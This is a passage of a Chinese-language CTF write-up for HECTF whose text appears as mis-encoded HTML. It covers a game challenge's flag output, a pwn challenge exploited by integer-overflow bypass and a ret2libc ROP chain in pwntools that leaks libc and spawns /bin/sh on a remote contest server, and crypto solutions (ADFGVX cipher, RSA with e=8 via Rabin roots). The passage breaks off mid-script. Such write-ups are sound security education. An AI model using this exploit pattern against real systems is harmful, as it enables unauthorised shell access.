class="line">è¯·è¾“å…¥å‚æ•° c ï¼š4</span><br><span class="line"></span><br><span class="line">------ ç¬¬5å±€ç»“æœ ------</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼ša=1, b=0, c=4</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼ša=0, b=3, c=1</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœï¼</span><br><span class="line">å½“å‰æ¯”åˆ†ï¼šæ‚¨ 3 - 2 ç—…æ¯’</span><br><span class="line"></span><br><span class="line">===== æ¯”èµ›ç»“æŸï¼=====</span><br><span class="line"></span><br><span class="line">===== æ‰€æœ‰å¯¹å±€è¯¦ç»†è®°å½• ====</span><br><span class="line"></span><br><span class="line">----- ç¬¬1å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=2, b=0, c=9  |  sumå€¼ï¼š63.09175</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=2, c=1  |  sumå€¼ï¼š53.78512</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬2å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=3, b=1, c=4  |  sumå€¼ï¼š58.40205</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=1, c=4  |  sumå€¼ï¼š62.10399</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬3å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=2, b=0, c=3  |  sumå€¼ï¼š65.67390</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=1, b=0, c=4  |  sumå€¼ï¼š67.33289</span><br><span class="line">ç»“æœï¼šç—…æ¯’è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬4å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=1, b=0, c=4  |  sumå€¼ï¼š67.33289</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=2, c=1  |  sumå€¼ï¼š53.78512</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœ</span><br><span class="line"></span><br><span class="line">----- ç¬¬5å±€ -----</span><br><span class="line">æ‚¨çš„é€‰æ‹©ï¼š      a=1, b=0, c=4  |  sumå€¼ï¼š67.33289</span><br><span class="line">ç—…æ¯’é€‰æ‹©ï¼š      a=0, b=3, c=1  |  sumå€¼ï¼š41.55686</span><br><span class="line">ç»“æœï¼šæ‚¨è·èƒœ</span><br><span class="line"></span><br><span class="line">===== æœ€ç»ˆç»“æœ =====</span><br><span class="line">æ­å–œæ‚¨è·èƒœï¼</span><br><span class="line">ç—…æ¯’æ‚„æ‚„æºœèµ°äº†ï¼Œå¹¶ç•™ä¸‹äº†ï¼šHECTF&#123;6NhZkUrkgIZdve6dnzXiAEFVpDuVffUv&#125;</span><br></pre></td></tr></table></figure><h2 id="shop"><a class="markdownIt-Anchor" href="#shop">#</a> <strong>shop</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">record_purchase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter product name:&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter product price:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter purchase description:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œchecksec ä¸€ä¸‹çœ‹çœ‹æ²¡æœ‰ä¿æŠ¤ï¼Œnx éƒ½æ²¡å¼€ï¼Œä¸éœ€è¦å°è¯•æ³„éœ² elf_baseï¼Œé€†å‘åˆ°å¯†ç ï¼š <code>shopadmin123</code> ï¼Œè¿™ä¸ªå‡½æ•°é‡Œå­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">manage_inventory</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter total purchase amount:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)check_amount(v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Amount exceeds limit! Access denied.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Amount verified. Proceeding to record...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> record_purchase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_BOOL8 __fastcall <span class="title function_">check_amount</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æœ€å expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;47.100.66.83&quot;</span>,<span class="number">30527</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter admin password:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;shopadmin123&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter total purchase amount:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product name:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product price:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter purchase description:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_edi_ret = <span class="number">0x0000000000401240</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">record_purchase = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_edi_ret) + p64(puts_got) + p64(puts_plt)+ p64(ret) + p64(record_purchase)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_real = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc_base = puts_real - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">syst_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter admin password:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;shopadmin123&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter total purchase amount:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product name:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product price:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter purchase description:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_edi_ret) + p64(binsh) + p64(syst_addr)+ p64(ret) + p64(record_purchase)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto</h1><h2 id="ä¸‹ä¸ªæ£‹å§"><a class="markdownIt-Anchor" href="#ä¸‹ä¸ªæ£‹å§">#</a> <strong>ä¸‹ä¸ªæ£‹å§</strong></h2><blockquote><p>å…ˆåˆ«åšé¢˜äº†ï¼Œflag ç»™ä½ ï¼Œè¿‡æ¥é™ªæˆ‘ä¸‹æŠŠæ£‹ï¼Œå¯¹äº†ï¼Œåˆ«å¿˜äº† flag è¦å¤§å†™ï¼ŒRERBVkFGR0RBWHtWR1ZHWEFYRFZHWEFYRFZWVkZWR1ZYVkdYQX0=</p></blockquote><p>â€‹base64 è§£å¯†å¾—åˆ° <code>DDAVAFGDAX&#123;VGVGXAXDVGXAXDVVVFVGVXVGXA&#125;</code> ï¼Œæ ¹æ®ä¸‹æ£‹å†…å®¹æœç´¢åˆ°æ˜¯æ£‹ç›˜å¯†ç ï¼Œå¾—åˆ° flag <code>hectf&#123;1145145201314&#125;</code> ï¼Œæ£‹ç›˜ç±»å‹æ˜¯ ADFGVXã€‚æœ€å flag ä¸ºï¼š <code>HECTF&#123;1145145201314&#125;</code></p><h2 id="simple_math"><a class="markdownIt-Anchor" href="#simple_math">#</a> <strong>simple_math</strong></h2><blockquote><p>ä¸€é“æ™®é€šçš„æ•°å­¦é¢˜ï¼Œæˆ‘ä¼šåšæ•°å­¦é¢˜ï¼Œä½ ä¼šåšæ•°å­¦é¢˜å—ï¼Ÿ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmodule</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = getPrime(bits)</span><br><span class="line">        g = getPrime(bits)</span><br><span class="line">        p = (f&lt;&lt;bits)+g</span><br><span class="line">        q = (g&lt;&lt;bits)+f</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">            <span class="keyword">assert</span>  p%<span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q%<span class="number">4</span> == <span class="number">3</span></span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line">n = getmodule(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 5573794528528829992069712881335829633592490157207670497446565713699227752853445149101948822818379411492395823975723302499892036773925698697672557700027422</span></span><br><span class="line"><span class="string">n = 6060692198787960152570793202726365711311067556697852613814176910700809041055277955552588176731629472381832554602777717596533323522044796564358407030079609</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹æœ‰ nï¼Œæœ‰ cï¼Œè¯•ç€åˆ†è§£ nï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">6060692198787960152570793202726365711311067556697852613814176910700809041055277955552588176731629472381832554602777717596533323522044796564358407030079609</span></span><br><span class="line">K = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">L = n % K</span><br><span class="line">M_low = (n &gt;&gt; <span class="number">128</span>) % K</span><br><span class="line">M_high = (n &gt;&gt; <span class="number">256</span>) % K</span><br><span class="line">H = n &gt;&gt; <span class="number">384</span></span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> carry <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">    A_hi = H - carry</span><br><span class="line">    <span class="keyword">if</span> A_hi &lt; <span class="number">0</span> <span class="keyword">or</span> A_hi &gt;= K:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    A = (A_hi &lt;&lt; <span class="number">128</span>) + L</span><br><span class="line">    Y = (carry &lt;&lt; <span class="number">256</span>) + (M_high &lt;&lt; <span class="number">128</span>) + M_low</span><br><span class="line">    B = Y - (L &lt;&lt; <span class="number">128</span>) - A_hi</span><br><span class="line">    <span class="keyword">if</span> B &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    u_sq = B + <span class="number">2</span> * A</span><br><span class="line">    d_sq = B - <span class="number">2</span> * A</span><br><span class="line">    u, u_rem = gmpy2.iroot(u_sq, <span class="number">2</span>)</span><br><span class="line">    d, d_rem = gmpy2.iroot(d_sq, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (u_rem <span class="keyword">and</span> d_rem):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    u = <span class="built_in">int</span>(u)</span><br><span class="line">    d = <span class="built_in">int</span>(d)</span><br><span class="line">    f = (u + d) // <span class="number">2</span></span><br><span class="line">    g = (u - d) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(f) <span class="keyword">and</span> isPrime(g) <span class="keyword">and</span> f.bit_length() == <span class="number">128</span> <span class="keyword">and</span> g.bit_length() == <span class="number">128</span>:</span><br><span class="line">        p = (f &lt;&lt; <span class="number">128</span>) + g</span><br><span class="line">        q = (g &lt;&lt; <span class="number">128</span>) + f</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q:&quot;</span>,q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p: 94775913392603172629814422762806227966393098973930911178857725348364686169243</span></span><br><span class="line"><span class="comment">#q: 63947599994968442166142762354632092599995017543858024932091322657529881751163</span></span><br></pre></td></tr></table></figure><p>â€‹æœ‰ pï¼Œqï¼Œnï¼Œcï¼Œeï¼Œä½†æ˜¯ e å’Œ phi ä¸äº’ç´ ï¼Œrabin è¿›è¡Œä¸‰æ¬¡äºŒæ¬¡å¼€æ–¹ï¼Œå¯ä»¥è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥å‚æ•°</span></span><br><span class="line">p = <span class="number">94775913392603172629814422762806227966393098973930911178857725348364686169243</span></span><br><span class="line">q = <span class="number">63947599994968442166142762354632092599995017543858024932091322657529881751163</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">5573794528528829992069712881335829633592490157207670497446565713699227752853445149101948822818379411492395823975723302499892036773925698697672557700027422</span></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_sqrt</span>(<span class="params">x, p, q, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    å•ä¸ªå€¼çš„RabinäºŒæ¬¡å¼€æ–¹ï¼ˆæ ¸å¿ƒå‡½æ•°ï¼‰ï¼šæ±‚è§£ yÂ² â‰¡ x mod n</span></span><br><span class="line"><span class="string">    è¿”å›æ¨¡nä¸‹çš„4ä¸ªäºŒæ¬¡å‰©ä½™è§£ï¼ˆRabinè§£å¯†çš„æ ‡å‡†4ä¸ªè§£ï¼‰</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. åˆ†åˆ«åœ¨æ¨¡pã€æ¨¡qä¸‹æ±‚è§£äºŒæ¬¡å‰©ä½™ï¼ˆåˆ©ç”¨4k+3ç´ æ•°ç‰¹æ€§ï¼‰</span></span><br><span class="line">    yp1 = <span class="built_in">pow</span>(x, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    yp2 = p - yp1  <span class="comment"># æ¨¡pçš„ä¸¤ä¸ªè§£</span></span><br><span class="line">    yq1 = <span class="built_in">pow</span>(x, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yq2 = q - yq1  <span class="comment"># æ¨¡qçš„ä¸¤ä¸ªè§£</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. é¢„è®¡ç®—æ¨¡é€†ï¼ˆé¿å…é‡å¤è®¡ç®—ï¼‰</span></span><br><span class="line">    inv_p = gmpy2.invert(p, q)</span><br><span class="line">    inv_q = gmpy2.invert(q, p)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼ˆCRTï¼‰åˆå¹¶4ç§è§£çš„ç»„åˆï¼Œå¾—åˆ°æ¨¡nçš„4ä¸ªè§£</span></span><br><span class="line">    <span class="comment"># ç»„åˆ1ï¼šyp1 &amp; yq1</span></span><br><span class="line">    y1 = (inv_q * q * yp1 + inv_p * p * yq1) % n</span><br><span class="line">    <span class="comment"># ç»„åˆ2ï¼šyp1 &amp; yq2</span></span><br><span class="line">    y2 = (inv_q * q * yp1 + inv_p * p * yq2) % n</span><br><span class="line">    <span class="comment"># ç»„åˆ3ï¼šyp2 &amp; yq1</span></span><br><span class="line">    y3 = (inv_q * q * yp2 + inv_p * p * yq1) % n</span><br><span class="line">    <span class="comment"># ç»„åˆ4ï¼šyp2 &amp; yq2</span></span><br><span class="line">    y4 = (inv_q * q * yp2 + inv_p * p * yq2) % n</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(y1), <span class="built_in">int</span>(y2), <span class="built_in">int</span>(y3), <span class="built_in">int</span>(y4)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_e8_with_rabin</span>(<span class="params">c, p, q, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    åˆ©ç”¨Rabinæ ¸å¿ƒæ€æƒ³æ±‚è§£e=8çš„æƒ…å†µï¼šmâ¸ â‰¡ c mod n</span></span><br><span class="line"><span class="string">    æ­¥éª¤ï¼šè¿ç»­3æ¬¡äºŒæ¬¡å¼€æ–¹ï¼ˆ8=2Â³ï¼‰ï¼Œé€æ­¥è¿­ä»£å€™é€‰è§£</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># ç¬¬1æ¬¡å¼€æ–¹ï¼šæ±‚è§£ x1Â² â‰¡ c mod n â†’ x1 = m^4ï¼ˆåˆå§‹å€™é€‰è§£ï¼‰</span></span><br><span class="line">    candidates_1 = rabin_sqrt(c, p, q, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬1æ¬¡å¼€æ–¹ï¼ˆå¾—åˆ°m^4çš„å€™é€‰è§£ï¼‰ï¼šå…±<span class="subst">&#123;<span class="built_in">len</span>(candidates_1)&#125;</span>ä¸ª&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç¬¬2æ¬¡å¼€æ–¹ï¼šå¯¹æ¯ä¸ªx1ï¼Œæ±‚è§£ x2Â² â‰¡ x1 mod n â†’ x2 = m^2</span></span><br><span class="line">    candidates_2 = <span class="built_in">set</span>()  <span class="comment"># ç”¨é›†åˆå»é‡</span></span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> candidates_1:</span><br><span class="line">        res = rabin_sqrt(x1, p, q, n)</span><br><span class="line">        candidates_2.update(res)</span><br><span class="line">    candidates_2 = <span class="built_in">list</span>(candidates_2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬2æ¬¡å¼€æ–¹ï¼ˆå¾—åˆ°m^2çš„å€™é€‰è§£ï¼‰ï¼šå…±<span class="subst">&#123;<span class="built_in">len</span>(candidates_2)&#125;</span>ä¸ª&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç¬¬3æ¬¡å¼€æ–¹ï¼šå¯¹æ¯ä¸ªx2ï¼Œæ±‚è§£ x3Â² â‰¡ x2 mod n â†’ x3 = mï¼ˆæœ€ç»ˆæ˜æ–‡å€™é€‰ï¼‰</span></span><br><span class="line">    candidates_3 = <span 